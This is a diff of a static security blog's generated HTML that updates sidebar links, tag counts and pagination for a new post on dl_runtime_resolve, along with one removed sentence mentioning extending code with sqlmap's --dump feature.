-<p>&emsp;&emsp;上面的代码还可以优化，比如增加sqlmap中的–dump功能，将所有的表跟字段都爆破出来。</p>
-
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-
-
 
     
 <div class="card card-transparent">
@@ -853,6 +874,8 @@
             <li><a class="pagination-link has-text-black-ter" href="/page/5/">5</a></li>
             
             <li><a class="pagination-link has-text-black-ter" href="/page/6/">6</a></li>
+            
+            <li><a class="pagination-link has-text-black-ter" href="/page/7/">7</a></li>
             
         </ul>
     </nav>
@@ -897,7 +920,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        60
+                        61
                     </p>
                 </div>
             </div>
@@ -1012,7 +1035,7 @@
         <h3 class="menu-label">
             标签云
         </h3>
-        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
+        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
     </div>
 </div>
 
@@ -1026,6 +1049,25 @@
         <h3 class="menu-label">
             最新文章
         </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/12/dl_runtime_resolve/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt之_dl_runtime_resolve">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-06T13:03:56.000Z">2018-12-06</time></div>
+                    <a href="/2018/12/dl_runtime_resolve/" class="has-link-black-ter is-size-6">got/plt之_dl_runtime_resolve</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -1103,25 +1145,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/11/bypass-pie-and-libcdatabase/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite2 and libcdatabase">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-27T13:00:56.000Z">2018-11-27</time></div>
-                    <a href="/2018/11/bypass-pie-and-libcdatabase/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite2 and libcdatabase</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1140,7 +1163,7 @@
                     <span class="level-item">十二月 2018</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">2</span>
+                    <span class="level-item tag">3</span>
                 </span>
             </a>
         </li>
@@ -1296,7 +1319,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">16</span>
+                            <span class="level-item tag">17</span>
                         </span>
                     </a>
                 </li>
@@ -1406,7 +1429,7 @@
                             <span class="level-item">pwn</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">1</span>
+                            <span class="level-item tag">2</span>
                         </span>
                     </a>
                 </li>
@@ -1545,6 +1568,25 @@
         
         <article class="media">
             
+            <a href="/2018/12/dl_runtime_resolve/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt之_dl_runtime_resolve">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-06T13:03:56.000Z">2018-12-06</time></div>
+                    <a href="/2018/12/dl_runtime_resolve/" class="has-link-black-ter is-size-6">got/plt之_dl_runtime_resolve</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
             <a href="/2018/12/rop-study/" class="media-left">
                 <p class="image is-64x64">
                     <img class="thumbnail" src="/images/thumbnail.svg" alt="x86 ROP study">
@@ -1619,25 +1661,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/11/bypass-pie-and-libcdatabase/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite2 and libcdatabase">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-27T13:00:56.000Z">2018-11-27</time></div>
-                    <a href="/2018/11/bypass-pie-and-libcdatabase/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite2 and libcdatabase</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1656,7 +1679,7 @@
                     <span class="level-item">十二月 2018</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">2</span>
+                    <span class="level-item tag">3</span>
                 </span>
             </a>
         </li>
@@ -1812,7 +1835,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">16</span>
+                            <span class="level-item tag">17</span>
                         </span>
                     </a>
                 </li>
@@ -1922,7 +1945,7 @@
                             <span class="level-item">pwn</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">1</span>
+                            <span class="level-item tag">2</span>
                         </span>
                     </a>
                 </li>
